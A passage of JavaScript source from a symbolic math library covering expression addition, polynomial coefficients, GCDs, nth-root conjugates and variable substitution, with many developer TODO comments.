    var y = this;
    if (x.equals(Expression.ZERO)) {
      return y;
    }
    if (y.equals(Expression.ZERO)) {
      return x;
    }

    //!2019-02-16
    if (x instanceof Multiplication && x.b instanceof IdentityMatrix) {
      var t = getIdentityMatrixCoefficient(y);
      if (t != null) {
        return x.a.add(t).multiply(x.b);
      }
    } else if (x instanceof IdentityMatrix) {
      var t = getIdentityMatrixCoefficient(y);
      if (t != null) {
        return Expression.ONE.add(t).multiply(x);
      }
    }
    if (y instanceof Multiplication && y.b instanceof IdentityMatrix) {
      var t = getIdentityMatrixCoefficient(x);
      if (t != null) {
        return t.add(y.a).multiply(y.b);
      }
    } else if (y instanceof IdentityMatrix) {
      var t = getIdentityMatrixCoefficient(x);
      if (t != null) {
        return t.add(Expression.ONE).multiply(y);
      }
    }
    //!2019-02-16

    //!new 2019-09-30
    /*
    if (x instanceof Expression.Addition && y instanceof Expression.Matrix) {//TODO:
      return x.a.add(x.b.add(y));
    }
    if (x instanceof Expression.Matrix && y instanceof Expression.Addition) {
      return x.add(y.a).add(y.b);
    }
    if (x instanceof Expression.Addition && y instanceof Expression.Addition) {
      if (x.b instanceof Expression.Matrix && y.b instanceof Expression.Matrix) {
        return x.a.add(x.b.add(y));
      }
    }
    */

    // rest
    
    //!new 2020-12-26
    if (/*Expression.isConstant(x) && Expression.isConstant(y) && */
        (has2(x, Expression.Complex) || has2(y, Expression.Complex)) &&
        (has2(x, Expression.ExpressionPolynomialRoot) || has2(y, Expression.ExpressionPolynomialRoot))) {
      var tmp = Expression.getComplexNumberParts(x);
      var tmp1 = Expression.getComplexNumberParts(y);
      var re = tmp.real.add(tmp1.real);
      var im = tmp.imaginary.add(tmp1.imaginary);
      if (im.equals(Expression.ZERO)) {
        return re;
      }
      if (!(im instanceof Expression.Addition)) {
        if (re.equals(Expression.ZERO)) {
          return im.multiply(Expression.I);
        }
        if (!has2(re, Expression.ExpressionPolynomialRoot) &&
            !has2(im, Expression.ExpressionPolynomialRoot)) {
          return re.add(im.multiply(Expression.I));
        }
        return new Expression.Addition(re, im.multiply(Expression.I));
      }
    }
    //!

    var i = x.summands();
    var j = y.summands();
    var a = i.next().value;
    var dontMove = 0;
    var b = j.next().value;
    var s = [];
    //a + b, compare4Addition("a", "b") > 0
    while (a != null && b != null) {
      var c = compare4Addition(a, b);
      if (c < 0) {
        s.push(a);
        a = i.next().value;
      } else if (c > 0) {
        s.push(b);
        b = j.next().value;
      } else {
        if (has2(a, Expression.Matrix) || has2(b, Expression.Matrix)) {
          var last = addSimilar(a, b);
          if (last != null) {
            if (!last.equals(Expression.ZERO)) {
              s.push(last);
            }
          } else {
            //TODO: fix
            s.push(a);
            s.push(b);
          }
        } else {
          var constantA = getConstant(a, true);
          var constantB = getConstant(b, true);
          var termA = getTerm(a, true) || Expression.ONE;
          var termB = getTerm(b, true) || Expression.ONE;
          var constant = (termA.equals(termB) ? constantA : constantA.multiply(termA.divide(termB))).add(constantB);
          var last = termB === Expression.ONE ? constant : (constant instanceof Expression.Addition ? new Expression.Multiplication(constant, termB) : constant.multiply(termB));
          dontMove = 0;
          if (!last.equals(Expression.ZERO)) {
            if (Expression.has(last, Expression.ExpressionPolynomialRoot)) {
              if (Expression.has(a, Expression.ExpressionPolynomialRoot)) {
                a = last;
                dontMove = 1;
              } else {
                b = last;
                dontMove = 2;
              }
            } else {
              s.push(last);
            }
          }
        }
        if (dontMove !== 1) {
          a = i.next().value;
        }
        if (dontMove !== 2) {
          b = j.next().value;
        }
      }
    }
    while (a != null) {
      s.push(a);
      a = i.next().value;
    }
    while (b != null) {
      s.push(b);
      b = j.next().value;
    }
    if (s.length === 0) {
      return Expression.ZERO;
    }
    var accumulator = s[s.length - 1];
    for (var k = s.length - 2; k >= 0; k -= 1) {
      var currentValue = s[k];
      accumulator = new Addition(accumulator, currentValue);
    }
    return accumulator;
  };

  var divideByInteger = function (e, f) {
    if (f.equals(Expression.ZERO)) {
      throw new TypeError("ArithmeticException");
    }
    var result = [];
    for (var iteratorx = e.summands()[globalThis.Symbol.iterator](), x = iteratorx.next().value; x != null; x = iteratorx.next().value) {
      var rest = Expression.ONE;
      var t = undefined;
      // TODO: check, fix?
      for (var iteratory = x.factors()[globalThis.Symbol.iterator](), y = iteratory.next().value; y != null; y = iteratory.next().value) {
        var z = y;
        if (z instanceof Integer || z instanceof Expression.Complex || z instanceof Expression.ExpressionPolynomialRoot) {
          if (t != undefined) {
            console.warn("!");
            t = t.multiply(z);
          } else {
            t = z;
          }
        } else {
          if (rest === Expression.ONE) {
            rest = z;
          } else {
            rest = z.multiply(rest);
          }
        }
      }
      if (!(t instanceof Expression.Complex)) {
      if (!(t instanceof Integer)) {
      if (!(t instanceof Expression.ExpressionPolynomialRoot)) {
        throw new RangeError();
      }
      }
      }
      var summand = null;
      if (t instanceof Expression.ExpressionPolynomialRoot) {//TODO: 
        summand = t.divide(f).multiply(rest);
      } else {
        summand = t.truncatingDivide(f).multiply(rest);
      }
      result.push(summand);
    }
    return _sum(result);
  };

  Expression.getCoefficients = function (e, v) {
    if (e.equals(Expression.ZERO)) {
      return [];
    }
    var result = [];
    for (var iteratorx = e.summands()[globalThis.Symbol.iterator](), x = iteratorx.next().value; x != null; x = iteratorx.next().value) {
      var d = Expression.ZERO;
      var c = Expression.ONE;
      for (var iteratory = x.factors()[globalThis.Symbol.iterator](), y = iteratory.next().value; y != null; y = iteratory.next().value) {
        var t = y;
        for (var iteratorve = getVariableInternal(t)[globalThis.Symbol.iterator](), ve = iteratorve.next().value; ve != null; ve = iteratorve.next().value) {
          if (ve.v.equals(v)) {
            d = d.add(ve.e);
          } else {
            c = c.multiply(ve.e === Expression.ONE ? ve.v : ve.v.pow(ve.e));
          }
        }
      }
      var degree = d.toNumber();
      result.push({
        degree: degree,
        coefficient: c
      });
    }
    result.sort(function (a, b) { return b.degree - a.degree; });
    var k = -1;
    for (var i = 0; i < result.length; i += 1) {
      var x = result[i];
      if (k === -1 || x.degree !== result[k].degree) {
        k += 1;
        result[k] = {
          degree: x.degree,
          coefficient: []
        };
      }
      result[k].coefficient.push(x.coefficient);
    }
    result.length = k + 1;
    for (var i = 0; i < result.length; i += 1) {
      result[i] = {
        degree: result[i].degree,
        coefficient: _sum(result[i].coefficient)
      };
    }
    return result;
  };

  //TODO: remove
  var getFirstAdditionOperand = function (x) {
    var result = x;
    while (result instanceof Addition) {
      result = result.a;
    }
    return result;
  };
  //TODO: remove
  var getLastMultiplicationOperand = function (x) {
    var result = x;
    while (result instanceof Multiplication) {
      result = result.b;
    }
    return result;
  };

  function VIterator(v) {
    if (v == undefined) {
      throw new TypeError();
    }
    this.value = undefined;
    this.v = v;
  }
  VIterator.prototype = Object.create(Iterator.prototype);
  VIterator.prototype.next = function () {
    this.value = this.v;
    this.v = undefined;
    return this;
  };

  function VariablesIterator(v, additions) {
    if (additions == undefined) {
      throw new TypeError();
    }
    this.value = undefined;
    this.v = v;
    this.additions = additions;
  }
  VariablesIterator.prototype = Object.create(Iterator.prototype);
  VariablesIterator.prototype.next = function () {
    var x = this.additions.next().value;
    var value = null;
    if (x == null) {
      value = null;
    } else if (x instanceof Expression.Symbol) {
      value = {v: new Exponentiation(this.v, x), e: Expression.ONE};
    } else if (x instanceof Expression.NthRoot) {//!new 2019-11-30
      value = {v: new Exponentiation(this.v, x), e: Expression.ONE};
    } else if (x instanceof Expression.Exponentiation) {//!new 2019-12-01
      value = {v: new Exponentiation(this.v, x), e: Expression.ONE};
    } else if (x instanceof Multiplication && x.a instanceof Integer) {
      value = {v: new Exponentiation(this.v, x.b), e: x.a};
    } else if (x instanceof Multiplication) {
      value = {v: new Exponentiation(this.v, getTerm(x)), e: getConstant(x)};
    } else if (x instanceof Integer) {
      value = {v: this.v, e: x};
    } else if (x instanceof Expression.Division && x.a instanceof Integer && x.b instanceof Integer) {//!new 2019-06-16
      value = {v: this.v, e: x};
    } else if (x instanceof Expression.Division && x.a instanceof NthRoot && x.b instanceof Integer) {//!new 2019-12-01
      //value = {v: new Exponentiation(this.v, x.a), e: x.getDenominator()};
      value = {v: new Exponentiation(this.v, x.getNumerator()), e: Expression.ONE.divide(x.getDenominator())};
    } else if (x instanceof Expression.Division && x.a instanceof Multiplication && x.a.a instanceof Integer && x.b instanceof Integer) {//!new 2019-06-16
      if (this.v instanceof Integer) {
        value = {v: new Exponentiation(this.v, x.a.b), e: x.divide(x.a.b)};
      } else {
      value = {v: this.v, e: x};//?
      }
    } else {
      // this.v instanceof Integer &&
      // && x.a instanceof Expression.Symbol
      if (x instanceof Division && x.b instanceof Integer) {
        var t = getTerm(x.a);
        value = {v: new Exponentiation(this.v, t), e: x.divide(t)};
      } else {
        if (x instanceof Division && x.a instanceof Integer && x.b instanceof Expression.Symbol && (this.v instanceof Integer || this.v instanceof Expression.Symbol || isGoodPolynomial(this.v))) {//TODO: fix ? 2**(1/n)
          var t = Expression.ONE.divide(x.b);
          value = {v: new Exponentiation(this.v, t), e: x.divide(t)};
        } else {
      throw new RangeError();
        }
      }
    }
    this.value = value;
    return this;
  };

  function NumeratorSummandsIterator(e) {
    this.value = undefined;
    this.internal = e.getNumerator().summands();
    this.denominator = e.getDenominator();
  }
  NumeratorSummandsIterator.prototype = Object.create(Iterator.prototype);
  NumeratorSummandsIterator.prototype.next = function () {
    var next = this.internal.next().value;
    this.value = next == null ? null : next.divide(this.denominator);
    return this;
  };

  var getVariableInternal = function (t) {
    if (t instanceof Expression.ExponentiationOfMinusOne) {//TODO: ?
      return new VIterator({v: t, e: Expression.ONE});
    }
    if (t instanceof Expression.ExponentiationOfImaginaryUnit) {//TODO: ?
      return new VIterator({v: t, e: Expression.ONE});
    }
    var v = getBase(t);
    var e = getExponent(t);

    //!new 2017-05-08
    if (enableEX) {
      if (!(e instanceof Integer)) {
        var additions = new NumeratorSummandsIterator(e);
        return new VariablesIterator(v, additions);
      }
    }
    //!
    return new VIterator({v: v, e: e});
  };

  var getVariable = function (e, options) {
options = options == undefined ?  null : options;

    if (options == null || !options.avoidNthRoots) {
    //? square roots at first
    for (var iteratorx = e.summands()[globalThis.Symbol.iterator](), x = iteratorx.next().value; x != null; x = iteratorx.next().value) {
      for (var iteratory = x.factors()[globalThis.Symbol.iterator](), y = iteratory.next().value; y != null; y = iteratory.next().value) {
        if (y instanceof NthRoot) {
        //TODO: assert(y instanceof Integer)
          return y;
        }
      }
    }
    //?
    }

    var result = getVariableInternal(getLastMultiplicationOperand(getFirstAdditionOperand(e))).next().value.v;
    //!?
    //if (result instanceof NthRoot) {
    //  return undefined;
    //}
    //
    if (result instanceof Expression.Complex) {
      return undefined;//?
    }
    if (result instanceof Integer) {
      return undefined;//?
    }
    if (options != null && options.avoidNthRoots) {
      if (result instanceof NthRoot) {
        return undefined;
      }
    }
    return result;
  };

  Expression.getVariable = getVariable;

  var lastMaxSize = 1;
  var integerGCD = function (x, y) {
    if (x instanceof Expression.Complex && x.real.equals(Expression.ZERO)) {
      x = x.imaginary;
    }
    if (y instanceof Expression.Complex && y.real.equals(Expression.ZERO)) {
      y = y.imaginary;
    }
    if (x instanceof Expression.Integer && y instanceof Expression.Integer) {
      return Expression.Integer.fromBigInt(bigIntGCDWrapper(x.value, y.value));
    }
    var a = x;
    var b = y;
    while (!b.equals(Expression.ZERO)) {
      var r = a.remainder(b);
      a = b;
      b = r;
    }
    return a;
  };

  //var getIntegerContent = function (x) {
  //  return x instanceof Expression.Complex ? integerGCD(x.real, x.imaginary) : x;
  //};

  var complexGCD = function (a, b) {//?
    if (a instanceof Expression.ExpressionPolynomialRoot) {
      var x = a.root.getAlphaExpression();
      return complexGCD(Expression.getConstant(x.getNumerator()), b);
    }
    if (b instanceof Expression.ExpressionPolynomialRoot) {
      var x = b.root.getAlphaExpression();
      return complexGCD(a, Expression.getConstant(x.getNumerator()));
    }

    /*if ((a instanceof Expression.ExpressionPolynomialRoot) && b instanceof Integer) {
      return b;
    }
    if (a instanceof Integer && (b instanceof Expression.ExpressionPolynomialRoot)) {
      return a;
    }
    if (a instanceof Expression.ExpressionPolynomialRoot && b instanceof Expression.ExpressionPolynomialRoot) {
      //TODO: ???
      return Expression.ONE;
    }*/
    // return integerGCD(getIntegerContent(a), getIntegerContent(b));
    var x = integerGCD(a, b);
    if (x instanceof Expression.Complex) {
      //TODO: ?
      if (x.real.compareTo(Expression.ZERO) === 0) {
        return x.imaginary;
      }
    }
    if (x instanceof Expression.Integer) {
      if (x.compareTo(Expression.ZERO) < 0) {
        x = x.negate();
      }
    }
    return x;
  };

  var nthRootCommonFactor = function (a, b) {
    if (a instanceof Expression.NthRoot && b instanceof Expression.NthRoot) {//TODO: ?
      // gcd(a**(1/n), b**(1/k)) = gcd(a**(lcm(n,k)/n/lcm(n,k)), b**(lcm(n,k)/k/lcm(n,k))) = gcd(a**(lcm(n,k)/n), b**(lcm(n,k)/k))**(1/lcm(n,k))
      var lcm = a.n / Math.gcd(a.n, b.n) * b.n;
      // gcd(a**n, b**k) = gcd((gcd(a, b)*a/gcd(a, b))**n, (gcd(a, b)*b/gcd(a, b))**k) = gcd(a, b)**min(n, k)
      var radicandsGCD = a.radicand.gcd(b.radicand);
      var min = Math.min(lcm / a.n, lcm / b.n);
      var g = Math.gcd(lcm, min);
      return radicandsGCD._pow(min / g)._nthRoot(lcm / g);
    }
    return null;
  };

  // http://www-troja.fjfi.cvut.cz/~liska/ca/node33.html
  var gcd = function (a, b, v) {
    if (v == undefined) {
      //!TODO: (2020-06-13)
      if (getTerm(a) instanceof Expression.NthRoot && getTerm(b) instanceof Expression.NthRoot) {//TODO: remove (?)
        return gcd(getConstant(a), getConstant(b)).multiply(gcd(a.divide(getConstant(a)), b.divide(getConstant(b))));
      }
      //?
      return complexGCD(getConstant(a, true), getConstant(b, true));
    }

    var r = getReplacement(a, getReplacement(b, v));
    if (!r.equals(v)) {
      return substitute(substitute(a, v, r, inverseReplacement(r, v)).gcd(substitute(b, v, r, inverseReplacement(r, v))), v, inverseReplacement(r, v), r);
    }

    return Polynomial.polynomialGCD(Polynomial.toPolynomial(a, v), Polynomial.toPolynomial(b, v)).calcAt(v);
  };

  // ! new 21.12.2013 (square roots)

  var getConjugateFactor = function (e) {
    var r = -1 / 0;
    for (var iteratorx = e.summands()[globalThis.Symbol.iterator](), x = iteratorx.next().value; x != null; x = iteratorx.next().value) {
      for (var iteratory = x.factors()[globalThis.Symbol.iterator](), y = iteratory.next().value; y != null; y = iteratory.next().value) {
        if (y instanceof NthRoot) {
          var degree = y.degree;
          if (r < degree) {
            r = degree;
          }
          if (!(y.a instanceof Integer)) {
            r = 1 / 0;
          }
        }
      }
    }
    var p = undefined;
    for (var iteratorx = e.summands()[globalThis.Symbol.iterator](), x = iteratorx.next().value; x != null; x = iteratorx.next().value) {
      for (var iteratory = x.factors()[globalThis.Symbol.iterator](), y = iteratory.next().value; y != null; y = iteratory.next().value) {
        if (y instanceof NthRoot) {
          var degree = y.degree;
          var i = y.a instanceof Integer ? y.a : null;
          if (i == null) {
            i = QuadraticInteger.toQuadraticInteger(y.a);
            if (i != null && p == undefined) {
              var pf = i.primeFactor();
              while (pf.toExpression() instanceof Expression.SquareRoot) {
                i = i.truncatingDivide(pf);
                pf = i.primeFactor();
              }
              i = pf;
            }
          }
          if (i == null) {
            throw new TypeError();
          }
          if (r === 1 / 0 && !(y.a instanceof Integer)) {
            r = degree;
          }
          if (r % degree === 0) {
            if (p == undefined) {
              p = i;
            }
            //TODO: assert(y instanceof Integer)
            if (i != null) {
              var z = integerGCD(p, i);
              if (!z.isUnit()) {
                p = z;//!
              }
              if (z.isUnit() && !(z instanceof Integer) && (p.isUnit() || i.isUnit())) {
                p = z;//?
              }
            } else {
              throw new TypeError();
            }
          }
        }
      }
    }
    //!new 2020-12-16 - ExpressionParser.parse('1/(x+cbrt(18)+cbrt(12))')
    if (p != undefined) {
      if (p instanceof Integer) {//TODO: ?
      p = p.primeFactor();
      }
    }
    //!
    return {p: p, degree: r};
  };

  // TODO: test
  var getConjugate = function (a) {
    var e = undefined;
    e = Expression.getComplexNumberParts(a);
    if (e != undefined && !e.imaginary.equals(Expression.ZERO)) {
      return e.real.subtract(e.imaginary.multiply(Expression.I));
    }
    e = Expression.getNthRootConjugate(a);
    if (e != undefined) {
      if (e.equals(a) && a instanceof Addition) {
        throw new TypeError();
      }
      return e;
    }
    return undefined;
  };

  Expression.getConjugate = getConjugate;

  Expression.getConjugateExpression = function (e) {//?
    try {
      var c = Expression.getConjugate(e);
      if (c != null) {
        return Expression.getConjugateExpression(c.multiply(e));
      }
      return e;
    } catch (error) {
      //TODO: FIX!!!
      console.error(error);
    }
    return null;
  };

  var getPolynomialRelativeToNthRoot = function (e, p, r) {
    // Make a polynomial, with a variable = p**(1/r):
    var polynomial = Polynomial.of();
    for (var iteratorx = e.summands()[globalThis.Symbol.iterator](), x = iteratorx.next().value; x != null; x = iteratorx.next().value) {
      var degree = 0;
      var coefficient = Expression.ONE;
      for (var iteratory = x.factors()[globalThis.Symbol.iterator](), y = iteratory.next().value; y != null; y = iteratory.next().value) {
        if (y instanceof NthRoot && (r === y.degree || r % y.degree === 0 && p instanceof Integer)) {
          var i = y.a instanceof Integer ? y.a : null;
          if (i == null) {
            i = QuadraticInteger.toQuadraticInteger(y.a);
          }
          if (i != null) {
            var j = 0;
            var a = i;
            if (p.isUnit()) {
              if (a.isUnit()) {
                j = 1;
                a = a.truncatingDivide(p);
                // a == 3+sqrt(2), p == 1+sqrt(2)
                while (a.primeFactor().equals(p)) {
                  j += 1;
                  a = a.truncatingDivide(p);
                }
              } else {
                if (!(a instanceof Integer)) {
                //TODO: ?
                //throw new TypeError();
                  var tmp = a.truncatingDivide(p);
                  if (!(tmp instanceof Expression.Integer)) {
                    if (Number.isNaN(Number(tmp.a.toString()) * Number(tmp.b.toString()))) {
                      throw new TypeError();//TODO: FIX
                    }
                  }
                  if (tmp instanceof Expression.Integer || Number(tmp.a.toString()) * Number(tmp.b.toString()) >= 0) {
                    j = 1;
                    a = tmp;
                  }
                }
              }
            } else {
              //TODO: optimize using ctz
              while (a.isDivisibleBy(p) && j < y.degree) {//?
                a = a.truncatingDivide(p);
                j += 1;
              }
            }
            a = a.toExpression();
            coefficient = coefficient.multiply(a._nthRoot(y.degree));
            degree += j * (r / y.degree);
          } else {
            throw new TypeError();
          }
        } else {
          coefficient = coefficient.multiply(y);
        }
      }
      //TODO: efficiency ?
      polynomial = polynomial.add(Polynomial.of(coefficient).shift(degree));
    }
    return polynomial;
  };

  // https://en.wikipedia.org/wiki/Conjugate_(square_roots)
  Expression.getNthRootConjugate = function (e) {
    var expression = e;
    if (e instanceof Integer) {
      //optimize to not stop the debugger at common code
      return null;
    }
    if (e instanceof NthRoot) {
      //optimize to not stop the debugger at common code
      return e._pow(e.n - 1);
    }
    if (e instanceof Multiplication && e.a instanceof Integer) {
      //optimize to not stop the debugger at common code
      return Expression.getNthRootConjugate(e.b);
    }
    //!2019-10-20 a workaround
    if (e instanceof Addition &&
        e.a instanceof Multiplication && e.a.a instanceof Integer && e.a.b instanceof NthRoot && e.a.b.n === 3 &&
        e.b instanceof Multiplication && e.b.a instanceof Integer && e.b.b instanceof NthRoot && e.b.b.n === 3) {
      // (aa-ab+bb)
      return e.a._pow(2).subtract(e.a.multiply(e.b)).add(e.b._pow(2));
    }
    //!
    //?
    //if (e instanceof Expression.Exponentiation && getExponent(e).equals(Expression.ONE.divide(Expression.TWO))) {//TODO: FIX
      //return e;//?
    //}
    //?

  //TODO: fix
    var tmp = getConjugateFactor(e);
    var p = tmp.p;
    var r = tmp.degree;
    if (p == undefined) {
      return undefined;
    }
    var polynomial = getPolynomialRelativeToNthRoot(e, p, r);
    polynomial = polynomial.divideAndRemainder(Polynomial.of(polynomial.getContent()), "throw").quotient;//!new
    var x = p.toExpression();
    var mod = Polynomial.of(Expression.ONE).shift(r).subtract(Polynomial.of(x));
    var conjugate2 = polynomial.modularInverse(mod).primitivePart();
    return conjugate2.calcAt(x._nthRoot(r));
  };

  // without the checks
  Expression.collectLinearEquationVariables = function (e) {
    if (e instanceof Division) {
      throw new RangeError();
    }
    var list = [];
    for (var iteratorx = e.summands()[globalThis.Symbol.iterator](), x = iteratorx.next().value; x != null; x = iteratorx.next().value) {
      var v = undefined;
      var c = Expression.ONE;
      var NO_VARIABLE = "";
      for (var iteratory = x.factors()[globalThis.Symbol.iterator](), y = iteratory.next().value; y != null; y = iteratory.next().value) {
        if (y instanceof Expression.Symbol && v == undefined) {
          v = y;
        } else {
          if (!(y instanceof Integer) && !(y instanceof NthRoot)) {
            if (v == undefined) {
              v = NO_VARIABLE;
            }
          }
          c = c.multiply(y);
        }
      }
      if (v == undefined) {
        v = NO_VARIABLE;
      }
      var variable = v === NO_VARIABLE ? "" : v.toString();
      list.push({c: c, v: variable});
    }
    return list;
  };

  var has = function (e, Class) {
    if (e instanceof Class) {
      return true;
    }
    if (e instanceof BinaryOperation) {
      if (e instanceof Addition) {
        while (e instanceof Addition) {
          if (has(e.b, Class)) {
            return true;
          }
          e = e.a;
        }
        return has(e, Class);
      }
      if (has(e.b, Class)) {
        return true;
      }
      return has(e.a, Class);
    }
    if (e instanceof Negation) {
      return has(e.b, Class);
    }

    if (e instanceof Expression.Function) {
      return has(e.a, Class);
    }
    return false;//?
  };
  Expression.has = has;

  var has2 = function (e, Class) {
    do {
      var e1 = null;
      if (e instanceof Addition) {
        e1 = e.b;
        e = e.a;
      } else {
        e1 = e;
        e = null;
      }
      do {
        var e2 = null;
        if (e1 instanceof Multiplication) {
          e2 = e1.b;
          e1 = e1.a;
        } else {
          e2 = e1;
          e1 = null;
        }
        if (e2 instanceof Class) {
          return true;
        }
      } while (e1 != null);
    } while (e != null);
    return false;
  };

  var inverseReplacement = function (e, v) {
    var t = v;
    while (!e.equals(v)) {
      if (e instanceof Expression.Exponentiation && e.b instanceof Multiplication && v instanceof Exponentiation) {
        t = t.pow(e.b.a.inverse());
        e = e.pow(e.b.a.inverse());
      } else if (e instanceof Expression.Exponentiation) {
        t = t.pow(getExponent(e).inverse());
        e = getBase(e);
      } else if (e instanceof Addition) {
        if (!(e.b instanceof Integer)) {
          throw new RangeError();
        }
        t = t.subtract(e.b);
        e = e.a;
      } else if (e instanceof Multiplication) {
        if (!(e.a instanceof Integer)) {
          throw new RangeError();
        }
        t = t.divide(e.a);
        e = e.b;
      } else if (e instanceof Division) {
        if (!(e.b instanceof Integer)) {
          throw new RangeError();
        }
        t = t.multiply(e.b);
        e = e.a;
      } else {
        if ((Expression.E === e) || (e instanceof Integer && e.compareTo(Expression.ONE) > 0) && getBase(v).equals(e)) {//!new 2019-09-23
          t = t.pow(getExponent(v));
          e = v;
        } else {
          throw new TypeError();
        }
      }
    }
    return t;
  };

  var h = function (e, n, q) {
    for (var iteratorx = e.summands()[globalThis.Symbol.iterator](), x = iteratorx.next().value; x != null; x = iteratorx.next().value) {
      for (var iteratory = x.factors()[globalThis.Symbol.iterator](), y = iteratory.next().value; y != null; y = iteratory.next().value) {
        if (getBase(q).equals(getBase(y))) {
          n = n.lcm(getExponent(y).getDenominator());
        }
      }
    }
    return n;
  };

  // t=sqrt(x**2+1)
  Replacement._counter = 0;
  function Replacement(from) {
    this.from = getBase(from);
    this.to = new Expression.Symbol("$t" + (++Replacement._counter)).pow(getExponent(from).getDenominator());
  }
  Replacement.prototype.apply = function (e) {
    var from = this.from;
    var to = this.to;
    var variable = getVariable(from);
    var p1 = Polynomial.toPolynomial(from.subtract(to), variable);
    
    return Expression._map(function (x) {
      if (!Expression.has(x, Expression.Division)) {
        var p2 = Polynomial.toPolynomial(x, variable);
        return p2.divideAndRemainder(p1).remainder.calcAt(variable);
      }
      return x;
    }, e);
  };
  Replacement.prototype.undo = function (e) {
    var variable = getBase(this.to);
    var r = this.from.pow(getExponent(this.to).inverse());
    return Expression._map(function (x) {
      if (x.equals(variable)) {
        return r;
      }
      return x;
    }, e);
  };
  Replacement.prototype.equals = function () {
    return true;//TODO: ?
  };

  // a^(2/3)+a^(1/3), a->a**3
  // -2*(-1)^n*3^(n/2)+2*3^(n/2), 3^n -> 3^(2*n)
  // (4*k+1)^(1/2)-1, k->(k^2-1)/4
  var getReplacement = function (e, v, originalVariable) {
    if (v instanceof Replacement) {
      return v;
    }
    for (var iteratorx = e.summands()[globalThis.Symbol.iterator](), x = iteratorx.next().value; x != null; x = iteratorx.next().value) {
      for (var iteratory = x.factors()[globalThis.Symbol.iterator](), y = iteratory.next().value; y != null; y = iteratory.next().value) {
        if (y instanceof Expression.Exponentiation && (Expression.has(y.a, Expression.Symbol) || y.a instanceof Integer && y.a.compareTo(Expression.ONE) > 0) && y.b instanceof Expression.Division) {
          if (getBase(v).equals(y.a)) {
            //v = new Expression.Exponentiation(y.a, y.b.b.lcm(getExponent(v).getNumerator()));
            v = new Expression.Exponentiation(y.a, getConstant(y.b.b).lcm(getExponent(v).getNumerator()).divide(getExponent(v).getDenominator()));
          } else if (getBase(v) instanceof Expression.Symbol) {
            if ((y.a instanceof Expression.Addition && y.a.a.divide(getBase(v)) instanceof Integer && y.a.b instanceof Integer) && (y.b instanceof Division && y.b.a instanceof Integer && y.b.b instanceof Integer)) {
              var n = y.b.getDenominator();
              n = h(e, n, y);//!
              //TODO: ?
              //debugger;
              // sqrt(y.a.a + y.a.b) = t
              // k * v = y.a.a = t**2 - y.a.b
              // v = (t**2 - y.a.b) / (y.a.a / v)
              var t = getBase(v).pow(n).subtract(y.a.b).divide(y.a.a.divide(getBase(v)));
              return t;
            } else {
              //TODO: test
              //throw new TypeError();
              if (originalVariable != null && originalVariable.equals(y.a)) {
                return new Replacement(y);
              }
            }
          }
        }
      }
    }
    return v;
  };

  Expression._getReplacement = getReplacement;

  var substitute = function (e, a, b, inv) {
    if (e.equals(a)) {
      return b;
    }
    if (e instanceof Expression.Exponentiation) {
      if (e.equals(inv)) {
        return a;
      }
      if (getBase(e).equals(getBase(inv))) {//!new 2019-09-23
        return a.pow(getExponent(e).divide(getExponent(inv)));
        //TODO: add an assertion below
      }
    }

    if (e instanceof Expression.Addition) {
      return substitute(e.a, a, b, inv).add(substitute(e.b, a, b, inv));
    }
    if (e instanceof Expression.Multiplication) {
      return substitute(e.a, a, b, inv).multiply(substitute(e.b, a, b, inv));
    }
    if (e instanceof Expression.Exponentiation) {
      var x = substitute(e.a, a, b, inv);
      var y = substitute(e.b, a, b, inv);
      //console.log(x + ' ' + y + ' ' + a + ' ' + b + ' ' + inv);
      if (x instanceof Expression.Exponentiation &&
          getBase(x).equals(getBase(inv)) &&
          getExponent(inv).getDenominator().remainder(Expression.TWO).equals(Expression.ZERO)) {
        //TODO: FIX
        return getBase(x).pow(getExponent(x).multiply(y));
      }
      return x.pow(y);
    }
    //return e;

    //! for sin.js:
    if (e instanceof Division) {
      return substitute(e.a, a, b, inv).divide(substitute(e.b, a, b, inv));
    }
    if (e instanceof Expression.Sin) {
      return substitute(e.a, a, b, inv).sin();
    }
    if (e instanceof Expression.Cos) {
      return substitute(e.a, a, b, inv).cos();
    }
    return e;
  };

  Expression._substitute = substitute;

  Expression.prototype.divideExpression = function (x) {
    var y = this;

    //if (Expression.getIdentityMatrixCoefficient(x) != undefined) {
    //  if (y instanceof Expression.Matrix) {
    //    return Expression.getIdentityMatrixCoefficient(x).divide(y);
    //  }
    //  return Expression.makeIdentityMatrixWithCoefficient(Expression.getIdentityMatrixCoefficient(x).divide(y));
    //}
    //if (Expression.getIdentityMatrixCoefficient(y) != undefined) {
    //  if (x instanceof Expression.Matrix) {
    //    return x.divide(Expression.getIdentityMatrixCoefficient(y));
    //  }
    //  return Expression.makeIdentityMatrixWithCoefficient(x.divide(Expression.getIdentityMatrixCoefficient(y)));
    //}

    //if (has(x, IdentityMatrix)) {//?
    //  throw new RangeError("NotSupportedError");
    //}
    //if (has(x, MatrixSymbol)) {
    //  throw new RangeError("NotSupportedError");
    //}

if (simplifyIdentityMatrixPower) {
    if (x instanceof Multiplication && x.b instanceof IdentityMatrix) {
      return x.b.equals(y) ? x.a : x.a.divide(y).multiply(x.b);
    } else if (x instanceof IdentityMatrix) {
      return Expression.ONE.divide(y).multiply(x);
    }
    if (y instanceof Multiplication && y.b instanceof IdentityMatrix) {
      return x.divide(y.a).multiply(y.b);
    } else if (y instanceof IdentityMatrix) {
      return x.multiply(y);
    }
}

    if (has(y, MatrixSymbol)) {
      //!?
      var tmp = getBase(y) instanceof MatrixSymbol ? y.pow(Expression.ONE.negate()) : new Expression.Exponentiation(y, Expression.ONE.negate());
      if (x.equals(Expression.ONE)) {
        if (y instanceof Multiplication) {
          //!?
          //TODO: info about properties of the Matrix Inversion
          if (Expression.callback != undefined) {
            Expression.callback(new Expression.Event("property-inverse-of-multiplication", {matrix: "{{0}}"}));
          }
          return x.multiply(Expression.ONE.divide(y.b).multiply(Expression.ONE.divide(y.a)));
        }
        if (y instanceof Addition && !has(y, Expression.Matrix)) {
          var f = Expression.simpleDivisor(y);
          if (f != null && !f.equals(Expression.ONE) && isScalar(f) && !gcd(f, y).equals(Expression.ONE)) {
            return x.multiply(Expression.ONE.divide(f).multiply(Expression.ONE.divide(y.divide(f))));
          }
        }
        return tmp;
      }
      //return x.multiply(tmp);
      //return new Expression.Multiplication(x, tmp);
      //throw new RangeError("NotSupportedError");
    }

    if (x instanceof Expression.Matrix && y instanceof Expression.Matrix) {
      // TODO: callback ???
      return new Expression.Matrix(x.matrix.multiply(y.matrix.inverse()));
    }
    if (x instanceof Expression.Matrix && y instanceof Expression) {
      //return new Expression.Matrix(x.matrix.scale(y.inverse()));
      return x.multiply(y.inverse());
    }
    if (x instanceof Expression && y instanceof Expression.Matrix) {
      if (Expression.callback != undefined) {
